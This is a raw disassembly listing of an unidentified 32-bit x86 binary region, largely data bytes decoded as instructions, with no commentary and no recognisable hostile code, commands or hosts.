  40174e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40174f:	add    eax,DWORD PTR [eax]
  401751:	xor    al,0xa6
  401753:	add    eax,DWORD PTR [eax]
  401755:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  401757:	add    eax,DWORD PTR [eax]
  401759:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40175b:	add    eax,DWORD PTR [eax]
  40175d:	cwde   
  40175e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40175f:	add    eax,DWORD PTR [eax]
  401761:	add    BYTE PTR [eax],al
  401763:	add    BYTE PTR [eax],al
  401765:	add    BYTE PTR [esp+eiz*4-0x6b31fffd],dl
  40176c:	add    eax,DWORD PTR [eax]
  40176e:	push   ss
  40176f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401770:	add    eax,DWORD PTR [eax]
  401772:	add    al,0xa4
  401774:	add    eax,DWORD PTR [eax]
  401776:	stos   BYTE PTR es:[edi],al
  401777:	mov    ds:0xa3d60003,eax
  40177c:	add    eax,DWORD PTR [eax]
  40177e:	jne    0x4017eb
  401780:	mov    ds:0xa26d7503,al
  401785:	add    esi,DWORD PTR [ebp-0x7b]
  401788:	mov    ds:0xa29d7503,al
  40178d:	add    esi,DWORD PTR [ebp-0x57]
  401790:	mov    ds:0xa5e37503,al
  401795:	add    esi,DWORD PTR [ebp-0x2d]
  401798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401799:	add    esi,DWORD PTR [ebp+0x1b]
  40179c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40179d:	add    esi,DWORD PTR [ebp+0x33]
  4017a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017a1:	add    esi,DWORD PTR [ebp+0xb]
  4017a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017a5:	add    esi,DWORD PTR [ebp+0x73]
  4017a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017a9:	add    esi,DWORD PTR [ebp+0x57]
  4017ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ad:	add    esi,DWORD PTR [ebp+0x29]
  4017b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017b1:	add    esi,DWORD PTR [ebp-0x5b]
  4017b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017b5:	add    esi,DWORD PTR [ebp+0x41]
  4017b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017b9:	add    esi,DWORD PTR [ebp+0x51]
  4017bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017bd:	add    esi,DWORD PTR [ebp-0x25]
  4017c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c1:	add    esi,DWORD PTR [ebp-0x17]
  4017c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c5:	add    esi,DWORD PTR [ebp-0x7]
  4017c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c9:	add    eax,DWORD PTR [eax]
  4017cb:	add    BYTE PTR [eax],al
  4017cd:	add    BYTE PTR [eax],al
  4017cf:	jne    0x4017ba
  4017d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017d2:	add    esi,DWORD PTR [ebp-0x63]
  4017d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017d6:	add    esi,DWORD PTR [ebp-0x75]
  4017d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017da:	add    esi,DWORD PTR [ebp+0x79]
  4017dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017de:	add    esi,DWORD PTR [ebp+0x7f]
  4017e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017e2:	add    esi,DWORD PTR [ebp+0x1]
  4017e5:	mov    dh,0x3
  4017e7:	jne    0x4017f6
  4017e9:	mov    dh,0x3
  4017eb:	jne    0x40182e
  4017ed:	mov    dh,0x3
  4017ef:	jne    0x401830
  4017f1:	mov    dh,0x3
  4017f3:	jne    0x401842
  4017f5:	mov    dh,0x3
  4017f7:	jne    0x401860
  4017f9:	mov    dh,0x3
  4017fb:	jne    0x4017ff
  4017fd:	push   ebx
  4017fe:	mov    ?,WORD PTR [esi+0x2]
  401801:	imul   ecx,DWORD PTR [esi-0x71c2fd8a],0x76
  401808:	add    dl,BYTE PTR [ecx]
  40180a:	mov    ?,WORD PTR [esi+0x2]
  40180d:	or     DWORD PTR [esi-0x722afd8a],ecx
  401813:	jbe    0x401817
  401815:	mov    bh,0x91
  401817:	jbe    0x40181b
  401819:	mov    ebp,0xc1027691
  40181e:	xchg   ecx,eax
  40181f:	jbe    0x401823
  401821:	arpl   WORD PTR [ecx-0x6ebcfd8a],dx
  401827:	jbe    0x40182b
  401829:	jne    0x4017bc
  40182b:	jbe    0x40182f
  40182d:	imul   edx,DWORD PTR [ecx-0x6ef2fd8a],0x0
  401834:	add    BYTE PTR [eax],al
  401836:	add    BYTE PTR [eax],al
  401838:	jbe    0x40183c
  40183a:	adc    eax,0x23027691
  40183f:	xchg   ecx,eax
  401840:	jbe    0x401844
  401842:	and    edx,DWORD PTR [ecx-0x6ef2fd8a]
  401848:	jbe    0x40184c
  40184a:	icebp  
  40184b:	nop
  40184c:	jbe    0x401850
  40184e:	in     eax,0x90
  401850:	jbe    0x401854
  401852:	push   ebp
  401853:	nop
  401854:	jbe    0x401858
  401856:	and    DWORD PTR [eax-0x6fdcfd8a],edx
  40185c:	jbe    0x401860
  40185e:	outs   dx,DWORD PTR ds:[esi]
  40185f:	nop
  401860:	jbe    0x401864
  401862:	dec    ebx
  401863:	nop
  401864:	jbe    0x401868
  401866:	ja     0x4017f8
  401868:	jbe    0x40186c
  40186a:	arpl   WORD PTR [eax-0x706cfd8a],dx
  401870:	jbe    0x401874
  401872:	mov    ecx,DWORD PTR [edi-0x7068fd8a]
  401878:	jbe    0x40187c
  40187a:	add    BYTE PTR [ebx-0x3effff0e],ah
  401880:	adc    DWORD PTR [ecx],eax
  401882:	add    BYTE PTR ds:0x50000e5,bl
  401888:	in     eax,0x0
  40188a:	add    bh,bh
  40188c:	repnz add BYTE PTR [eax],al
  40188f:	out    0xea,eax
  401891:	add    BYTE PTR [eax],al
  401893:	sar    edi,cl
  401895:	add    BYTE PTR [eax],al
  401897:	mov    eax,ds:0xaf0000ff
  40189c:	add    BYTE PTR [eax],al
  40189e:	add    BYTE PTR [eax],al
  4018a0:	add    bh,ch
  4018a2:	add    BYTE PTR [eax],al
  4018a4:	ja     0x401895
  4018a6:	add    BYTE PTR [eax],al
  4018a8:	push   ecx
  4018a9:	inc    DWORD PTR [eax]
  4018ab:	add    BYTE PTR [ebx-0x1],bh
  4018ae:	add    BYTE PTR [eax],al
  4018b0:	imul   ebp,edi,0xeffd0000
  4018b6:	add    BYTE PTR [eax],al
  4018b8:	daa    
  4018b9:	inc    BYTE PTR [eax]
  4018bb:	add    BYTE PTR ds:0x290000fe,ch
  4018c1:	out    dx,al
  4018c2:	add    BYTE PTR [eax],al
  4018c4:	mov    ch,0xef
  4018c6:	add    BYTE PTR [eax],al
  4018c8:	paddd  mm0,QWORD PTR [eax]
  4018cb:	add    cl,bh
  4018cd:	inc    DWORD PTR [eax]
  4018cf:	add    cl,ah
  4018d1:	out    dx,eax
  4018d2:	add    BYTE PTR [eax],al
  4018d4:	push   ebx
  4018d5:	in     al,dx
  4018d6:	add    BYTE PTR [eax],al
  4018d8:	dec    edi
  4018d9:	cld    
  4018da:	add    BYTE PTR [eax],al
  4018dc:	and    edi,esp
  4018de:	add    BYTE PTR [eax],al
  4018e0:	and    ebp,esp
  4018e2:	add    BYTE PTR [eax],al
  4018e4:	jae    0x4018d2
  4018e6:	add    BYTE PTR [eax],al
  4018e8:	push   ecx
  4018e9:	cld    
  4018ea:	add    BYTE PTR [eax],al
  4018ec:	outs   dx,DWORD PTR ds:[esi]
  4018ed:	cld    
  4018ee:	add    BYTE PTR [eax],al
  4018f0:	xchg   edi,eax
  4018f1:	in     al,dx
  4018f2:	add    BYTE PTR [eax],al
  4018f4:	jge    0x4018e2
  4018f6:	add    BYTE PTR [eax],al
  4018f8:	add    BYTE PTR [eax],bl
  4018fa:	jp     0x4018ff
  4018fc:	add    BYTE PTR [edx],bl
  4018fe:	jp     0x401903
  401900:	add    BYTE PTR [edx],ah
  401902:	jp     0x401907
  401904:	add    BYTE PTR [eax],al
  401906:	add    BYTE PTR [eax],al
  401908:	add    BYTE PTR [eax],al
  40190a:	sub    bh,BYTE PTR [edx+0x3]
  40190d:	add    BYTE PTR [edx+0x7a],ah
  401910:	add    eax,DWORD PTR [eax]
  401912:	es js  0x401918
  401915:	add    BYTE PTR [eax],al
  401917:	js     0x40191c
  401919:	add    BYTE PTR [edx-0x61],ch
  40191c:	add    eax,DWORD PTR [eax]
  40191e:	sbb    al,0x0
  401920:	add    BYTE PTR [eax],al
  401922:	repnz stos BYTE PTR es:[edi],al
  401924:	add    eax,DWORD PTR [eax]
  401926:	mov    esi,0x8c0003aa
  40192b:	stos   BYTE PTR es:[edi],al
  40192c:	add    eax,DWORD PTR [eax]
  40192e:	sbb    al,0x0
  401930:	add    BYTE PTR [eax],al
  401932:	add    al,0x0
  401934:	add    BYTE PTR [eax-0x7fffffee],al
  40193a:	push   cs
  40193b:	add    BYTE PTR [eax],al
  40193d:	and    ch,0xff
  401940:	(bad)  
  401941:	jg     0x40191f
  401943:	(bad)  
  401944:	(bad)  
  401945:	call   edx
  401947:	mov    es,WORD PTR [ebx]
  401949:	add    BYTE PTR [esp+ecx*4+0x3],bl
  40194d:	add    BYTE PTR [eax],bh
  40194f:	mov    WORD PTR [ebx],es
  401951:	add    ah,bl
  401953:	(bad)  
  401954:	(bad)  
  401955:	(bad)  
  401956:	jmp    0x38c:0xde00038c
  40195d:	add    BYTE PTR [edx],bl
  40195f:	mov    WORD PTR [ebx],es
  401961:	add    BYTE PTR [esi-0x74],cl
  401964:	add    eax,DWORD PTR [eax]
  401966:	jmp    0x38d:0xb600038d
  40196d:	add    BYTE PTR [eax],al
  40196f:	add    BYTE PTR [eax],al
  401971:	add    BYTE PTR [eax],al
  401973:	ror    BYTE PTR [ebp-0x723bfffd],cl
  401979:	add    eax,DWORD PTR [eax]
  40197b:	jne    0x401952
  40197d:	popf   
  40197e:	add    esi,DWORD PTR [ebp-0x53]
  401981:	popf   
  401982:	add    esi,DWORD PTR [ebp-0xd]
  401985:	add    eax,DWORD PTR [eax]
  401987:	cmc    
  401988:	rcr    BYTE PTR [ebp-0x62248afd],cl
  40198e:	add    esi,DWORD PTR [ebp-0x11]
  401991:	sahf   
  401992:	add    esi,DWORD PTR [ebp-0x43]
  401995:	sahf   
  401996:	add    esi,DWORD PTR [ebp-0x4b]
  401999:	sahf   
  40199a:	add    esi,DWORD PTR [ebp-0x69]
  40199d:	sahf   
  40199e:	add    esi,DWORD PTR [ebp+0x6b]
  4019a1:	sahf   
  4019a2:	add    esi,DWORD PTR [ebp+0x61]
  4019a5:	sahf   
  4019a6:	add    esi,DWORD PTR [ebp+0x6f]
  4019a9:	sahf   
  4019aa:	add    esi,DWORD PTR [ebp+0x35]
  4019ad:	lahf   
  4019ae:	add    esi,DWORD PTR [ebp+0x45]
  4019b1:	lahf   
  4019b2:	add    esi,DWORD PTR [ebp+0x33]
  4019b5:	lahf   
  4019b6:	add    esi,DWORD PTR [ebp-0x27]
  4019b9:	add    eax,DWORD PTR [eax]
  4019bb:	jne    0x401974
  4019bd:	pushf  
  4019be:	add    esi,DWORD PTR [ebp-0x27]
  4019c1:	add    eax,DWORD PTR [eax]
  4019c3:	jne    0x401a38
  4019c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019c6:	add    esi,DWORD PTR [ebp-0x1]
  4019c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019ca:	add    esi,DWORD PTR [ebp-0x7]
  4019cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019ce:	add    esi,DWORD PTR [ebp+0xd]
  4019d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019d2:	add    esi,DWORD PTR [ebp+0x25]
  4019d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019d6:	add    eax,DWORD PTR [eax]
  4019d8:	add    BYTE PTR [eax],al
  4019da:	add    BYTE PTR [eax],al
  4019dc:	jne    0x4019ef
  4019de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019df:	add    esi,DWORD PTR [ebp-0x11]
  4019e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019e3:	add    esi,DWORD PTR [ebp-0x33]
  4019e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019e7:	add    esi,DWORD PTR [ebp+0x45]
  4019ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019eb:	add    esi,DWORD PTR [ebp+0x51]
  4019ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019ef:	add    esi,DWORD PTR [ebp+0x11]
  4019f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019f3:	add    esi,DWORD PTR [ebp+0x25]
  4019f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019f7:	add    esi,DWORD PTR [ebp+0x2]
  4019fa:	arpl   WORD PTR [ebp-0x5ab8fd8a],sp
  401a00:	jbe    0x401a04
  401a02:	jge    0x4019a9
  401a04:	jbe    0x401a08
  401a06:	imul   esp,DWORD PTR [ebp-0x5a6efd8a],0xa5a10276
  401a10:	jbe    0x401a14
  401a12:	and    DWORD PTR [esi+esi*2+0x76a41102],esp
  401a19:	add    bl,bl
  401a1b:	mov    ds:0x9bf30276,eax
  401a20:	jbe    0x401a24
  401a22:	or     DWORD PTR [esi+esi*2+0x76a36f02],ebx
  401a29:	add    dh,BYTE PTR ds:0x1d02769c
  401a2f:	pushf  
  401a30:	jbe    0x401a34
  401a32:	inc    edi
  401a33:	pushf  
  401a34:	jbe    0x401a38
  401a36:	das    
  401a37:	pushf  
  401a38:	jbe    0x401a3c
  401a3a:	jno    0x4019d8
  401a3c:	jbe    0x401a40
  401a3e:	jge    0x4019dc
  401a40:	add    BYTE PTR [eax],al
  401a42:	add    BYTE PTR [eax],al
  401a44:	add    BYTE PTR [esi+0x2],dh
  401a47:	inc    ebp
  401a48:	pushf  
  401a49:	jbe    0x401a4d
  401a4b:	push   ebx
  401a4c:	pushf  
  401a4d:	jbe    0x401a51
  401a4f:	mov    bl,0x9c
  401a51:	jbe    0x401a55
  401a53:	mov    eax,ds:0x8f02769c
  401a58:	pushf  
  401a59:	jbe    0x401a5d
  401a5b:	jne    0x4019f9
  401a5d:	jbe    0x401a61
  401a5f:	jmp    0x4019fd
  401a61:	jbe    0x401a65
  401a63:	pop    ds
  401a64:	sahf   
  401a65:	jbe    0x401a69
  401a67:	sbb    ebx,DWORD PTR [esi-0x61f6fd8a]
  401a6d:	jbe    0x401a71
  401a6f:	fstp   QWORD PTR [ebp-0x620efd8a]
  401a75:	jbe    0x401a79
  401a77:	add    BYTE PTR [ecx],dh
  401a79:	clc    
  401a7a:	add    eax,0x5f03d00
  401a7f:	add    BYTE PTR [edi-0x18],al
  401a82:	add    eax,0x5e02f00
  401a87:	add    bl,dl
  401a89:	fiadd  WORD PTR ds:0x5165500
  401a8f:	add    BYTE PTR [edi+0x8],al
  401a92:	add    eax,0x5003b00
  401a97:	add    BYTE PTR [ebx-0x8],cl
  401a9a:	add    al,0x0
  401a9c:	pop    ebx
  401a9d:	lock add al,0x0
  401aa0:	adc    DWORD PTR [ebx],0x5
  401aa3:	add    BYTE PTR [edi-0x68fffae5],cl
  401aa9:	add    BYTE PTR [eax],al
  401aab:	add    BYTE PTR [eax],al
  401aad:	add    BYTE PTR [ebx],dl
  401aaf:	add    eax,0x4dbbb00
  401ab4:	add    bh,dl
  401ab6:	rol    DWORD PTR [eax+eax*1],cl
  401ab9:	mov    ebp,0xe50004db
  401abe:	cli    
  401abf:	add    al,0x0
  401ac1:	shl    edx,cl
  401ac3:	add    al,0x0
  401ac5:	iret   
  401ac6:	jmp    0x4:0xe2db0004
  401acd:	and    edi,edx
  401acf:	add    al,0x0
  401ad1:	xlat   BYTE PTR ds:[ebx]
  401ad2:	adc    al,0x5
  401ad4:	add    bl,cl
  401ad6:	adc    al,0x5
  401ad8:	add    bl,bl
  401ada:	adc    al,0x5
  401adc:	add    BYTE PTR [edi+0x15],dh
  401adf:	add    eax,0x5157900
  401ae4:	add    BYTE PTR [ebx+0x15],al
  401ae7:	add    eax,0x5152700
  401aec:	add    BYTE PTR [ebp-0x74fffaeb],bl
  401af2:	aad    0x4
  401af4:	add    BYTE PTR [eax],al
  401af6:	sbb    ah,BYTE PTR [edx-0x5e15fffd]
  401afc:	add    eax,DWORD PTR [eax]
  401afe:	test   al,0xa1
  401b00:	add    eax,DWORD PTR [eax]
  401b02:	out    0xa1,al
  401b04:	add    eax,DWORD PTR [eax]
  401b06:	les    esp,FWORD PTR [ecx-0x5e55fffd]
  401b0c:	add    eax,DWORD PTR [eax]
  401b0e:	stos   BYTE PTR es:[edi],al
  401b0f:	mov    eax,ds:0x3
  401b14:	add    BYTE PTR [eax],al
  401b16:	add    BYTE PTR [esi-0x5d],dl
  401b19:	add    eax,DWORD PTR [eax]
  401b1b:	je     0x401aa4
  401b1d:	add    eax,DWORD PTR [eax]
  401b1f:	jp     0x401aa8
  401b21:	add    eax,DWORD PTR [eax]
  401b23:	push   es
  401b24:	mov    BYTE PTR [ebx],al
  401b26:	add    al,bl
  401b28:	xchg   BYTE PTR [ebx],al
  401b2a:	add    BYTE PTR [eax-0x5bfffc75],ch
  401b30:	mov    eax,DWORD PTR [ebx]
  401b32:	add    BYTE PTR [edx-0x75],bh
  401b35:	add    eax,DWORD PTR [eax]
  401b37:	push   esp
  401b38:	mov    eax,DWORD PTR [ebx]
  401b3a:	add    BYTE PTR [esi-0x75],dh
  401b3d:	add    eax,DWORD PTR [eax]
  401b3f:	jo     0x401acc
  401b41:	add    eax,DWORD PTR [eax]
  401b43:	ins    BYTE PTR es:[edi],dx
  401b44:	mov    eax,DWORD PTR [ebx]
  401b46:	add    BYTE PTR [esi],ch
  401b48:	lea    eax,[ebx]
  401b4a:	add    BYTE PTR [edx-0x5e],bh
  401b4d:	add    eax,DWORD PTR [eax]
  401b4f:	push   esp
  401b50:	mov    ds:0xa28c0003,al
  401b55:	add    eax,DWORD PTR [eax]
  401b57:	outs   dx,BYTE PTR ds:[esi]
  401b58:	mov    ds:0xa23c0003,al
  401b5d:	add    eax,DWORD PTR [eax]
  401b5f:	pushf  
  401b60:	mov    ds:0xa3080003,al
  401b65:	add    eax,DWORD PTR [eax]
  401b67:	in     al,0xa2
  401b69:	add    eax,DWORD PTR [eax]
  401b6b:	add    al,0x88
  401b6d:	add    eax,DWORD PTR [eax]
  401b6f:	int3   
  401b70:	add    eax,DWORD PTR [eax]
  401b72:	add    BYTE PTR [ebp-0x61],dh
  401b75:	scas   eax,DWORD PTR es:[edi]
  401b76:	add    esi,DWORD PTR [ebp+0xf]
  401b79:	mov    al,0x3
  401b7b:	add    BYTE PTR [eax],al
  401b7d:	add    BYTE PTR [eax],al
  401b7f:	add    BYTE PTR [ebp-0x23],dh
  401b82:	scas   eax,DWORD PTR es:[edi]
  401b83:	add    esi,DWORD PTR [ebp+0x27]
  401b86:	mov    ch,0x3
  401b88:	jne    0x401bc1
  401b8a:	mov    ch,0x3
  401b8c:	jne    0x401b99
  401b8e:	mov    ch,0x3
  401b90:	jne    0x401bef
  401b92:	mov    ch,0x3
  401b94:	jne    0x401bd5
  401b96:	mov    ch,0x3
  401b98:	jne    0x401bfb
  401b9a:	mov    ch,0x3
  401b9c:	jne    0x401b21
  401b9e:	mov    ah,0x3
  401ba0:	jne    0x401b27
  401ba2:	mov    ah,0x3
  401ba4:	jne    0x401b4d
  401ba6:	mov    ah,0x3
  401ba8:	jne    0x401b6b
  401baa:	mov    ah,0x3
  401bac:	jne    0x401b7f
  401bae:	mov    ah,0x3
  401bb0:	jne    0x401b87
  401bb2:	mov    ah,0x3
  401bb4:	jne    0x401b89
  401bb6:	mov    ch,0x3
  401bb8:	jne    0x401b61
  401bba:	mov    ch,0x3
  401bbc:	jne    0x401b59
  401bbe:	mov    ch,0x3
  401bc0:	jne    0x401b51
  401bc2:	mov    ch,0x3
  401bc4:	jne    0x401bf1
  401bc6:	mov    dh,0x3
  401bc8:	jne    0x401c2b
  401bca:	mov    ch,0x3
  401bcc:	jne    0x401c03
  401bce:	mov    ch,0x3
  401bd0:	jne    0x401bab
  401bd2:	add    eax,DWORD PTR [eax]
  401bd4:	jne    0x401bbf
  401bd6:	add    eax,DWORD PTR [eax]
  401bd8:	cmc    
  401bd9:	add    al,0x4
  401bdb:	add    ch,dh
  401bdd:	in     al,dx
  401bde:	add    eax,DWORD PTR [eax]
  401be0:	cmc    
  401be1:	lds    eax,FWORD PTR [ebx]
  401be3:	add    BYTE PTR [eax],al
  401be5:	add    BYTE PTR [eax],al
  401be7:	add    BYTE PTR [eax],al
  401be9:	cmc    
  401bea:	into   
  401beb:	add    eax,DWORD PTR [eax]
  401bed:	cmc    
  401bee:	(bad)  
  401bef:	add    eax,DWORD PTR [eax]
  401bf1:	cmc    
  401bf2:	retf   0x3b2
  401bf5:	jne    0x401bf9
  401bf7:	or     eax,0xce0276b3
  401bfc:	add    esi,DWORD PTR [ebp-0x7e]
  401bff:	aad    0xb2
  401c01:	jbe    0x401c05
  401c03:	sti    
  401c04:	add    esi,DWORD PTR [ebp-0x7e]
  401c07:	aad    0xb2
  401c09:	jbe    0x401c0d
  401c0b:	retf   
  401c0c:	mov    dl,0x76
  401c0e:	add    dl,BYTE PTR [ecx-0x5efd894e]
  401c14:	mov    dl,0x76
  401c16:	add    ch,ah
  401c18:	add    esi,DWORD PTR [ebp-0x7e]
  401c1b:	fnsave [edx+0x3ed0276]
  401c21:	jne    0x401ba5
  401c23:	call   0x7503:0xeb827503
  401c2a:	adc    dh,0x3
  401c2d:	jne    0x401bb1
  401c2f:	jmp    0x794292e6
  401c34:	add    esi,DWORD PTR [ebp-0x7e]
  401c37:	jmp    0x7503:0xfa827503
  401c3e:	sub    dh,0x3
  401c41:	jne    0x401bc5
  401c43:	fadd   QWORD PTR [ebx]
  401c45:	jne    0x401bc9
  401c47:	shl    DWORD PTR [esi+esi*2+0x3e802],cl
  401c4e:	add    BYTE PTR [eax],al
  401c50:	add    BYTE PTR [eax],al
  401c52:	jne    0x401bd6
  401c54:	fadd   DWORD PTR [ebx]
  401c56:	jne    0x401bda
  401c58:	jmp    0x91429160
  401c5d:	mov    al,0x76
  401c5f:	add    bl,BYTE PTR [ebx-0x6afd8950]
  401c65:	mov    al,0x76
  401c67:	add    ah,bh
  401c69:	mov    al,0x76
  401c6b:	add    bl,cl
  401c6d:	mov    al,0x76
  401c6f:	add    bl,ch
  401c71:	mov    al,0x76
  401c73:	add    al,BYTE PTR [eax]
  401c75:	iret   
  401c76:	add    eax,0x5b90002
  401c7b:	add    al,BYTE PTR [eax]
  401c7d:	and    DWORD PTR [edx+eax*1],eax
  401c80:	add    BYTE PTR [edi-0x42fffdfb],ah
  401c86:	in     eax,0x1
  401c88:	add    BYTE PTR [edi-0x32fffe1b],ch
  401c8e:	in     eax,0x1
  401c90:	add    bh,cl
  401c92:	in     eax,0x1
  401c94:	add    bh,ch
  401c96:	loopne 0x401c99
  401c98:	add    cl,ch
  401c9a:	jbe    0x401c9e
  401c9c:	add    BYTE PTR [edi-0x16],al
  401c9f:	add    DWORD PTR [eax],eax
  401ca1:	sub    eax,0x5d0001e2
  401ca6:	or     al,BYTE PTR [ecx]
  401ca8:	add    BYTE PTR [ebx+0x2],cl
  401cab:	add    DWORD PTR [eax],eax
  401cad:	jae    0x401cb9
  401caf:	add    DWORD PTR [eax],eax
  401cb1:	add    DWORD PTR [ebx],0x8d0001
  401cb7:	add    BYTE PTR [eax],al
  401cb9:	add    BYTE PTR [eax],al
  401cbb:	jmp    0x401cbd
  401cbd:	add    BYTE PTR [ecx+0x290000e3],bl
  401cc3:	jmp    0x2:0x76e90000
  401cca:	mov    dl,0xf5
  401ccc:	stos   DWORD PTR es:[edi],eax
  401ccd:	rcl    BYTE PTR ds:[ebp+0x4c894cec],1
  401cd4:	loope  0x401cc5
  401cd6:	inc    esp
  401cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cd8:	test   DWORD PTR ds:0xa521d98d,edi
  401cde:	imul   edi,DWORD PTR [ebx-0x14],0xc6e644f
  401ce5:	jae    0x401d11
  401ce7:	xor    al,0x95
  401ce9:	push   ss
  401cea:	push   ds
  401ceb:	stos   DWORD PTR es:[edi],eax
  401cec:	ret    
  401ced:	sbb    al,BYTE PTR [esi+0x4e4774]
  401cf3:	mov    ds:0x2ab12e25,eax
  401cf8:	dec    esi
  401cf9:	cwde   
  401cfa:	mov    bh,0xe0
  401cfc:	aam    0x8b
  401cfe:	repz lahf 
  401d00:	sti    
  401d01:	icebp  
  401d02:	inc    edx
  401d03:	aas    
  401d04:	add    ah,BYTE PTR [edi-0x22]
  401d07:	(bad)  
  401d08:	or     ah,bh
  401d0a:	and    ebx,DWORD PTR [ebx]
  401d0c:	sub    BYTE PTR [esi+ebx*2+0x7e],0xec
  401d11:	pop    edi
  401d12:	inc    edi
  401d13:	push   ss
  401d14:	fucomip st,st(2)
  401d16:	xor    eax,ebx
  401d18:	xchg   esi,eax
  401d19:	jno    0x401d8e
  401d1b:	sbb    eax,0x29339c
  401d20:	add    BYTE PTR [eax],al
  401d22:	add    BYTE PTR [eax],al
  401d24:	adc    BYTE PTR [edi-0x2e],0x11
  401d28:	push   ds
  401d29:	out    dx,eax
  401d2a:	(bad)  
  401d2b:	mov    edi,0x603e78cb
  401d30:	icebp  
  401d31:	pushf  
  401d32:	xor    ebp,DWORD PTR [ecx]
  401d34:	inc    edx
  401d35:	pop    ecx
  401d36:	rcl    BYTE PTR [ecx],cl
  401d38:	sahf   
  401d39:	in     eax,dx
  401d3a:	(bad)  
  401d3b:	mov    edi,0x603e780b
  401d40:	push   cs
  401d41:	ins    DWORD PTR es:[edi],dx
  401d42:	pop    es
  401d43:	cmc    
  401d44:	in     eax,dx
  401d45:	ret    0x11d3
  401d48:	lds    edx,FWORD PTR [edi-0x1ac0000]
  401d4e:	loope  0x401d71
  401d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d51:	sbb    edx,DWORD PTR [ebp-0x53]
  401d54:	or     eax,0xaa474abd
  401d59:	cmc    
  401d5a:	sti    
  401d5b:	or     al,0x6c
  401d5d:	push   ebx
  401d5e:	mov    bh,0x38
  401d60:	jmp    0x99b0fa6a
  401d65:	cmp    ch,al
  401d67:	inc    esi
  401d68:	call   0x2824:0x9fb623ee
  401d6f:	(bad)  
  401d70:	jne    0x401db2
  401d72:	mov    esp,0x95616465
  401d77:	mov    ebp,0x53e75337
  401d7c:	test   DWORD PTR ds:0x39775a1c,ebp
  401d82:	sub    DWORD PTR [eax-0x2b],ecx
  401d85:	push   esp
  401d86:	cmp    eax,0x9c
  401d8b:	add    BYTE PTR [eax],al
  401d8d:	xor    BYTE PTR [ebx-0x32],dh
  401d90:	ja     0x401dc6
  401d92:	sub    DWORD PTR [ebx+0x7a46aa95],esi
  401d98:	mov    DWORD PTR [edx+0x3b32ba1d],esp
  401d9e:	ja     0x401d78
  401da0:	fidiv  DWORD PTR [ebx+0x3e]
  401da3:	adc    ebx,DWORD PTR [edx]
  401da5:	xchg   DWORD PTR [ebx],edx
  401da7:	aas    
  401da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401da9:	jns    0x401e11
  401dab:	sub    eax,0x925c2f6c
  401db0:	lahf   
  401db1:	add    ebp,ecx
  401db3:	std    
  401db4:	jge    0x401e1e
  401db6:	xchg   edi,eax
  401db7:	fimul  DWORD PTR [ebp+eiz*4-0x2e]
  401dbb:	push   ebp
  401dbc:	fdiv   DWORD PTR [ebp-0x7946d5bb]
  401dc2:	sbb    eax,0xeb299bf8
  401dc7:	(bad)  
  401dc8:	ror    ebx,0xde
  401dcb:	jae    0x401d9e
  401dcd:	mov    ss,WORD PTR fs:[ebx-0x33ebcb00]
  401dd4:	std    
  401dd5:	xor    bl,BYTE PTR [edx-0x63]
  401dd8:	adc    cl,BYTE PTR [ecx+0x34]
  401ddb:	jno    0x401dac
  401ddd:	test   BYTE PTR [ecx+0x36],dh
  401de0:	add    bh,cl
  401de2:	fdivr  DWORD PTR [eax]
  401de4:	cs pop ecx
  401de6:	dec    edi
  401de7:	daa    
  401de8:	xor    eax,0xd15340bc
  401ded:	add    dl,BYTE PTR fs:[edi-0x63]
  401df1:	add    BYTE PTR [eax],al
  401df3:	add    BYTE PTR [eax],al
  401df5:	add    BYTE PTR [ebp-0x3e],dh
  401df8:	cs scas al,BYTE PTR es:[edi]
  401dfa:	std    
  401dfb:	and    DWORD PTR [ecx-0x63],ebp
  401dfe:	xchg   esi,eax
  401e00:	push   cs
  401e01:	jno    0x401db5
  401e03:	adc    BYTE PTR [ecx+0x36],dh
  401e06:	jne    0x401da0
  401e08:	jmp    0x505ec145
  401e0d:	(bad)  
  401e0e:	and    ecx,DWORD PTR [ebp+0x10b2815d]
  401e14:	mov    ah,BYTE PTR [ebp+0x75]
  401e17:	cwde   
  401e18:	jmp    0x6efb534e
  401e1d:	popf   
  401e1e:	xchg   esi,eax
